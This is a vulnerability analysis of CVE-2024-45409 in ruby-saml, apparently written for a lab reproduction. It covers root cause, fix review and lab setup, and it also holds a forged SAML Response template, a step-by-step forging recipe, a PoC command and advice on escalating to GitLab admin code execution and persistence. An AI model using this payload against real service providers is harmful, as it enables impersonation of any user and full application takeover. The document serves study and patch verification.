# Vulnerability Analysis: CVE-2024-45409

## Root Cause

**Incorrect XPath scoping in SAML signature verification allows XML Signature Wrapping (XSW) attack.**

The `XMLSecurity::SignedDocument#validate_signature` method in `lib/xml_security.rb` (ruby-saml v1.16.0) uses **document-global XPath selectors** (`//`) instead of **context-relative selectors** (`./`) when resolving signature-related XML elements during digest verification.

In XPath 1.0, the `//` abbreviation means `/descendant-or-self::node()/` starting from the **document root**, regardless of the context node passed to the XPath engine. This means that `REXML::XPath.first(sig_element, "//ds:Reference", ...)` does NOT search within `sig_element` — it searches the entire document from root and returns the first matching element in document order.

An attacker exploits this by injecting a forged `<ds:Reference>` element early in the document (before the legitimate one) that points to a modified assertion with a recomputed digest. The signature verification passes because:
1. The **digest check** uses the attacker's injected Reference (wrong element found by `//ds:Reference`)
2. The **cryptographic signature verification** validates the original `<ds:SignedInfo>` which was genuinely signed by the IdP

The result is a complete authentication bypass: the code believes it verified the assertion's integrity, but actually verified the attacker's forged digest, while the cryptographic signature covers the original (unmodified) SignedInfo.

### Vulnerability Class
- CWE-347: Improper Verification of Cryptographic Signature
- XML Signature Wrapping (XSW) attack

## Vulnerable File(s) and Function(s)

### Primary: `lib/xml_security.rb` — `XMLSecurity::SignedDocument#validate_signature`

**Line 317** — Main vulnerability entry point:
```ruby
ref = REXML::XPath.first(sig_element, "//ds:Reference", {"ds"=>DSIG})
```
Finds the first `<ds:Reference>` anywhere in the document, not within `sig_element`. An attacker-injected Reference in `<samlp:StatusDetail>` (which appears earlier in document order) is found instead of the legitimate one in `<ds:SignedInfo>`.

**Line 321-324** — Canonicalization method from wrong context:
```ruby
canon_algorithm = canon_algorithm REXML::XPath.first(
  ref,
  '//ds:CanonicalizationMethod',
  { "ds" => DSIG }
)
```

**Line 331-335** — Digest method from wrong context:
```ruby
digest_algorithm = algorithm(REXML::XPath.first(
  ref,
  "//ds:DigestMethod",
  { "ds" => DSIG }
))
```

**Line 337-341** — Digest value from wrong context:
```ruby
encoded_digest_value = REXML::XPath.first(
  ref,
  "//ds:DigestValue",
  { "ds" => DSIG }
)
```

**Line 362-367** — Transforms from wrong context:
```ruby
def process_transforms(ref, canon_algorithm)
  transforms = REXML::XPath.match(
    ref,
    "//ds:Transforms/ds:Transform",
    { "ds" => DSIG }
  )
```

### Supporting: `lib/onelogin/ruby-saml/response.rb`

**Lines 827-911** — `validate_signature` method orchestrates signature verification by calling into `XMLSecurity::SignedDocument`. The validation chain is:
1. `response.rb#validate_signature` → finds Signature elements, determines which document to validate
2. `xml_security.rb#validate_document` or `validate_document_with_cert` → checks certificate fingerprint
3. `xml_security.rb#validate_signature` → **THE VULNERABLE METHOD** — performs digest + signature verification

**Lines 536-591** — `validate_signed_elements` checks structural constraints on Signature elements. This validation passes the attack because:
- The attacker's injected Reference is NOT inside a `<ds:Signature>` element, so it's invisible to this check
- The moved legitimate Signature has its parent as Assertion (valid), with matching ID/URI (attacker ensures this)

### Helper: `lib/xml_security.rb` — `extract_signed_element_id` (line 393-404)

```ruby
def extract_signed_element_id
  reference_element = REXML::XPath.first(
    self,
    "//ds:Signature/ds:SignedInfo/ds:Reference",
    {"ds"=>DSIG}
  )
  return nil if reference_element.nil?
  sei = reference_element.attribute("URI").value[1..-1]
  sei.nil? ? reference_element.parent.parent.parent.attribute("ID").value : sei
end
```
This also uses `//` but requires the full `Signature/SignedInfo/Reference` path, so the attacker's standalone injected Reference (in `StatusDetail`) is not matched. This method correctly finds the legitimate Reference and returns the expected element ID.

## Triggering Input

### SAML Response Structure (Attack Payload)

The attacker takes a legitimately signed SAML Response from the IdP and restructures it:

```xml
<samlp:Response ID="RANDOM_NEW_ID" ...>
  <saml:Issuer>idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <!-- INJECTED: Malicious Reference in StatusDetail -->
    <samlp:StatusDetail>
      <ds:Reference xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                    URI="#ASSERTION_ID">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>RECOMPUTED_DIGEST_OF_MODIFIED_ASSERTION</ds:DigestValue>
      </ds:Reference>
    </samlp:StatusDetail>
  </samlp:Status>
  <saml:Assertion ID="ASSERTION_ID" ...>
    <saml:Issuer>idp.example.com</saml:Issuer>
    <!-- MOVED: Original ds:Signature from Response level into Assertion -->
    <ds:Signature>
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="..."/>
        <ds:SignatureMethod Algorithm="..."/>
        <ds:Reference URI="#ASSERTION_ID">
          <!-- Original digest (won't be checked due to //ds:Reference bug) -->
          <ds:DigestMethod Algorithm="..."/>
          <ds:DigestValue>ORIGINAL_DIGEST</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>ORIGINAL_VALID_SIGNATURE</ds:SignatureValue>
      <ds:KeyInfo>...</ds:KeyInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>ATTACKER_CHOSEN_USER@example.com</saml:NameID>  <!-- MODIFIED -->
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2030-01-01T00:00:00Z" .../>  <!-- EXTENDED -->
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotOnOrAfter="2030-01-01T00:00:00Z" ...>  <!-- EXTENDED -->
      <saml:AudienceRestriction>
        <saml:Audience>sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement SessionNotOnOrAfter="2030-01-01T00:00:00Z" ...>  <!-- EXTENDED -->
      ...
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>
```

### Key Steps to Construct the Payload

1. **Obtain any legitimately signed SAML Response** (even expired; intercepted from network, logs, or a test account login)
2. **Change the Response's `ID`** attribute to a new random value (prevents replay detection)
3. **Move `<ds:Signature>`** from Response level into the Assertion (after `<saml:Issuer>`)
4. **Set Assertion's `ID`** to match the Signature's `<ds:Reference URI>` (strip the `#` prefix)
5. **Modify `<saml:NameID>`** to target user (e.g., `admin@example.com`)
6. **Extend temporal conditions**: `NotOnOrAfter` on Conditions, SubjectConfirmationData, and `SessionNotOnOrAfter` on AuthnStatement
7. **Insert crafted `<ds:Reference>`** into `<samlp:StatusDetail>` containing:
   - Same `URI` attribute pointing to the Assertion's ID
   - Matching `DigestMethod` algorithm
   - Freshly computed `DigestValue` = Base64(digest(canonicalize(modified_assertion)))
8. **Base64-encode** and URL-encode the forged response
9. **Submit as `SAMLResponse` parameter** to the SP's Assertion Consumer Service (ACS) endpoint via HTTP POST

### Critical Detail: Document Order Matters

The injected `<ds:Reference>` in `<samlp:StatusDetail>` MUST appear **before** the legitimate `<ds:Reference>` inside `<ds:Signature>/<ds:SignedInfo>` in XML document order. This is naturally satisfied because `<samlp:Status>` (containing StatusDetail) appears before `<saml:Assertion>` (containing the moved Signature) in the SAML Response schema.

## Attack Scenario

### Prerequisites
- Access to **any** legitimately signed SAML Response from the target IdP (expired is fine)
- Knowledge of the target SP's ACS endpoint URL
- Knowledge of a valid target username (e.g., admin email)

### Step-by-Step Attack

1. **Obtain a signed SAML Response**: The attacker logs in with their own account to the SP (via the IdP) and captures the SAMLResponse from the POST to the ACS endpoint. Alternatively, they intercept any SAML Response (e.g., from logs, network capture, or a test environment using the same IdP).

2. **Forge the SAML Response**: Using the Synacktiv PoC tool or manual XML manipulation:
   ```bash
   python3 CVE-2024-45409.py -r captured_response.xml -n admin@example.com -o forged_response.xml
   ```

3. **Submit to the SP**: POST the forged response to the SP's ACS endpoint:
   ```
   POST /saml/acs HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   SAMLResponse=<base64-encoded-forged-response>&RelayState=<original-relay-state>
   ```

4. **Authentication bypass**: The SP (using ruby-saml ≤1.16.0) validates the forged response:
   - `validate_signed_elements` passes (Signature is child of Assertion, URI matches ID)
   - `validate_signature` → `validate_document`/`validate_document_with_cert` calls `validate_signature` on SignedDocument
   - The `//ds:Reference` XPath finds the attacker's injected Reference (first in document order)
   - Digest check passes (attacker's DigestValue matches the modified assertion's digest)
   - Signature check passes (original SignedInfo signature is cryptographically valid)
   - All temporal conditions pass (attacker extended them)
   - SP authenticates the attacker as `admin@example.com`

## Impact

**Critical — Complete Authentication Bypass (CVSS 10.0)**

- **Unauthenticated remote attacker** can impersonate **any user** in the system
- Admin account takeover leads to full application compromise
- Works with **expired** SAML responses (no time window constraint for the initial capture)
- Affects all applications using ruby-saml for SAML SP functionality, including:
  - GitLab CE/EE (≤16.11.10) — widely deployed CI/CD platform
  - Any Rails application using omniauth-saml (≤1.10.3, 2.0.0–2.1.0)
  - Custom Ruby applications using ruby-saml directly

## Authentication Requirements

**This is a pre-authentication vulnerability.** No authentication to the target SP is required.

However, the attacker needs:
1. **A previously captured signed SAML Response** from the target IdP. This can be obtained by:
   - Logging in with the attacker's own (legitimate) account on the SP
   - Intercepting any SAML authentication flow via network capture
   - Extracting from logs (some SPs log SAML responses)
   - Using a response from a test/dev environment sharing the same IdP signing key
2. **The IdP certificate** embedded in the captured response (already present in `<ds:X509Certificate>`)
3. **Target user's NameID** (typically an email address, often discoverable)

For the lab PoC, authentication flow is:
- A minimal SP app with ruby-saml v1.16.0
- A mock IdP with a self-signed certificate (test cert provided at `test/certificates/ruby-saml.crt` and `test/certificates/ruby-saml.key`)
- The SP trusts the IdP's certificate fingerprint
- Generate a legitimate SAML Response using the IdP's signing key, then forge it with the PoC script

## Fix Assessment

**The fix (commit `4865d03`) is thorough and correctly addresses the root cause of CVE-2024-45409.**

### Changes Made (all in `lib/xml_security.rb`)

| Line(s) | Before (Vulnerable) | After (Fixed) | Purpose |
|---------|---------------------|---------------|---------|
| 312-317 | N/A | `signed_info_element = REXML::XPath.first(sig_element, "./ds:SignedInfo", ...)` | New: resolve SignedInfo relative to Signature |
| 317→319 | `REXML::XPath.first(sig_element, "//ds:Reference", ...)` | `REXML::XPath.first(signed_info_element, "./ds:Reference", ...)` | Core fix: Reference found under SignedInfo only |
| 319→321-327 | `document.at_xpath("//*[@ID=$id]", ...)` | `document.xpath(...)` + `if reference_nodes.length > 1` | Defense-in-depth: reject duplicate ID elements |
| 321-324→329-332 | `REXML::XPath.first(ref, '//ds:CanonicalizationMethod', ...)` | `REXML::XPath.first(signed_info_element, './ds:CanonicalizationMethod', ...)` | Canonicalization from SignedInfo context |
| 331-335→342-345 | `REXML::XPath.first(ref, "//ds:DigestMethod", ...)` | `REXML::XPath.first(ref, "./ds:DigestMethod", ...)` | DigestMethod relative to Reference |
| 337-341→347-350 | `REXML::XPath.first(ref, "//ds:DigestValue", ...)` | `REXML::XPath.first(ref, "./ds:DigestValue", ...)` | DigestValue relative to Reference |
| 365→377 | `"//ds:Transforms/ds:Transform"` | `"./ds:Transforms/ds:Transform"` | Transforms relative to Reference |

### Remaining `//` XPath Patterns (NOT Fixed, NOT Exploitable)

The following `//` patterns remain in the vulnerable file but do not create exploitable attack vectors:

1. **`extract_signed_element_id`** (line 396): `"//ds:Signature/ds:SignedInfo/ds:Reference"` — Requires full Signature/SignedInfo/Reference path. The attacker's injected Reference in StatusDetail does not match this path. Not exploitable.

2. **`extract_inclusive_namespaces`** (line 409): `"//ec:InclusiveNamespaces"` — An attacker could theoretically inject an InclusiveNamespaces element, but this would only change canonicalization namespace handling, which would cause the digest to fail (not pass). Not exploitable for authentication bypass.

3. **`validate_document`** (line 203): `"//ds:X509Certificate"` — Finding the certificate from the response. The certificate is validated against the known IdP fingerprint/cert, so injecting a different certificate would fail fingerprint verification. Not exploitable.

4. **`validate_signature`** (line 280, 307): `"//ds:Signature"` — Finding the Signature element. With the `validate_signed_elements` check ensuring 1-2 valid Signatures with correct parent elements, this is not exploitable.

### Conclusion

The fix correctly addresses the root cause by changing all critical XPath selectors from document-global (`//`) to context-relative (`./`) within the digest verification path. The additional duplicate-ID check provides defense-in-depth. **The fix is complete for this vulnerability.**

## Potential Bypass Vectors

None identified. The fix correctly:
1. Scopes Reference resolution to the actual SignedInfo element
2. Scopes DigestMethod/DigestValue/Transforms resolution to the legitimate Reference
3. Rejects documents with duplicate ID elements
4. The remaining `//` patterns are either sufficiently constrained by their full path or serve different validation purposes not susceptible to this attack

## Escalation Path

**Authentication bypass → Full application compromise**

The SAML authentication bypass provides the attacker with the ability to authenticate as **any user**, including administrators. Depending on the target application:

1. **GitLab**: Admin access enables:
   - Reading all repositories (source code, secrets)
   - Modifying CI/CD pipelines for supply chain attacks
   - Creating personal access tokens for persistence
   - **RCE via Admin Console** → Import Project → custom project template with malicious CI config, or via the Rails console (Admin Area → Monitoring → Background Jobs in Sidekiq, or direct Admin API)
   - Modifying runner configurations for code execution on CI runners

2. **Generic Rails/Rack SAML SP**: Admin impersonation provides whatever privileges the admin role has in the application

3. **Persistence**: After initial access, the attacker can create local accounts, API tokens, or SSH keys that survive SAML configuration changes

**Impact escalation is application-dependent but trivially achievable for admin-level targets.**

## Related Attack Surface

### Same Vulnerability Pattern in Adjacent Code

1. **`lib/xml_security.rb` line 146** — `noko_sig_element.at_xpath('//ds:Signature/ds:SignedInfo', ...)` in the `sign_document` method of `XMLSecurity::Document`. This is the signing path (not verification), so it's not exploitable for authentication bypass. Used when the SP generates signed requests.

2. **`lib/onelogin/ruby-saml/response.rb` line 487-493** — `validate_num_assertion` uses `"//a:Assertion"` and `"//a:EncryptedAssertion"` to count assertions. These are document-global but intentionally so (counting ALL assertions). The check ensures exactly 1 assertion exists. In the CVE-2024-45409 attack, the attacker does NOT add extra assertions, so this passes.

3. **`lib/onelogin/ruby-saml/response.rb` line 539** — `validate_signed_elements` uses `"//ds:Signature"` to find ALL signatures. This is intentionally document-global (enumerating all signatures). The method correctly validates each signature's parent element and Reference URI.

4. **`lib/onelogin/ruby-saml/logoutresponse.rb`** and **`lib/onelogin/ruby-saml/slo_logoutrequest.rb`** — These use HTTP Redirect Binding with query-string signatures (not XML signatures), so they are NOT affected by the XPath vulnerability.

### No Other Files Share the Vulnerable Pattern

The `//ds:Reference` (without full path qualification) pattern that enables the attack exists only in `validate_signature` and `process_transforms` within `xml_security.rb`. Both are fixed in the patch.

## Build System

- **Type:** RubyGems with Bundler
- **Build files:** `ruby-saml.gemspec`, `Gemfile`, `Rakefile`
- **Version:** 1.16.0 (tag `v1.16.0`, commit `148a4c2`)

## Build Commands

```bash
# Install Ruby (3.1+ recommended)
# For the lab container (Debian/Ubuntu):
apt-get install -y ruby ruby-dev build-essential libxml2-dev libxslt-dev

# Install the vulnerable gem version
gem install ruby-saml -v 1.16.0

# OR from source:
cd source
gem install bundler
bundle install

# For running tests:
bundle exec rake test
```

## Dependencies

### Runtime Dependencies
- **ruby** >= 2.7 (recommended; minimum 1.8.7 per gemspec but modern Ruby preferred)
- **nokogiri** >= 1.13.10 — XML parsing and canonicalization (C extension, needs libxml2-dev, libxslt-dev)
- **rexml** — XML parsing and XPath (this is where the vulnerability lives; stdlib in Ruby < 3.0, gem in Ruby >= 3.0)
- **openssl** — Cryptographic signature verification (stdlib)
- **base64** — Encoding/decoding SAML messages (stdlib)

### Development/Test Dependencies
- **minitest** ~> 5.5 — Test framework
- **shoulda** ~> 2.11 — Test DSL
- **mocha** ~> 0.14 — Mocking
- **rake** >= 12.3.3 — Build tool
- **timecop** ~> 0.9 — Time manipulation for tests

### PoC Script Dependencies
- **python3** >= 3.8
- **lxml** — XML parsing library (`pip install lxml`)

## Runtime Requirements

### For Lab Reproduction

1. **SAML Service Provider (SP)**: A minimal Ruby web application using ruby-saml v1.16.0 to process SAML responses. Needs:
   - A web server (e.g., Sinatra, Rails) with a POST endpoint for ACS
   - ruby-saml configured with IdP certificate fingerprint
   - Endpoint that calls `OneLogin::RubySaml::Response.new(params[:SAMLResponse], settings: settings).is_valid?`

2. **SAML Identity Provider (IdP)**: A signing service that can produce legitimate SAML responses. Options:
   - **Mock IdP script** (simplest): Ruby script using `XMLSecurity::Document#sign_document` to generate and sign a SAML Response with the test certificate (`test/certificates/ruby-saml.crt` / `ruby-saml.key`)
   - **SimpleSAMLphp**: Full-featured test IdP (Docker image available)
   - **Direct construction**: Generate a valid SAML XML, sign it with `openssl` CLI

3. **Test Certificate**: Use the included test certificates:
   - `test/certificates/ruby-saml.crt` — X.509 certificate (RSA 1024-bit, self-signed)
   - `test/certificates/ruby-saml.key` — RSA private key
   - Certificate fingerprint (SHA1): compute with `openssl x509 -in ruby-saml.crt -fingerprint -noout`

4. **Network**: The SP needs an HTTP endpoint accessible for POSTing the forged SAMLResponse

### Minimal Lab Architecture

```
[Attacker Machine]
    |
    | 1. Capture legitimate SAML Response (any user)
    | 2. Run PoC to forge response (target: admin)
    | 3. POST forged SAMLResponse to SP's ACS
    v
[SP Container: Ruby + ruby-saml v1.16.0]
    |
    | ACS endpoint processes forged SAML Response
    | validate_signature → passes (XSW attack succeeds)
    | SP authenticates attacker as admin
    v
[Success: Admin session granted]
```

### Docker Base Image Recommendation

**`ruby:3.1-slim`** (Debian-based, includes ruby, gem, bundle)
- Install: `apt-get install -y build-essential libxml2-dev libxslt-dev`
- Then: `gem install ruby-saml -v 1.16.0 sinatra thin`
- Python for PoC: `apt-get install -y python3 python3-pip && pip install lxml`

Alternatively, a multi-stage build with separate SP and attacker containers connected via Docker network.
